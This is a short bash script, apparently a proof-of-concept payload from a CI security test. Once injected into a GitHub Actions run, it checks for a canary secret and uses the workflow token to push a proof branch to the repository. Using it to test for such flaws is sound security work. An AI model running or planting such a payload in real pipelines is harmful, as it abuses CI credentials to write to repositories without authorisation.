#!/usr/bin/env bash
set -euo pipefail
branch="vm7-token-write-proof-${GITHUB_SHA:0:12}"
echo "ATTACKER_GITHUB_TOKEN_WRITE_CODE=1"
echo "CANARY_PRESENT=$([ -n "${VM7_CODEINJ_CANARY:-}" ] && echo 1 || echo 0)"
echo "PROOF_BRANCH=$branch"
echo "PROOF_SOURCE_SHA=$(git rev-parse HEAD)"
git push origin "HEAD:refs/heads/$branch"
echo "GITHUB_TOKEN_WRITE_SUCCEEDED=1"
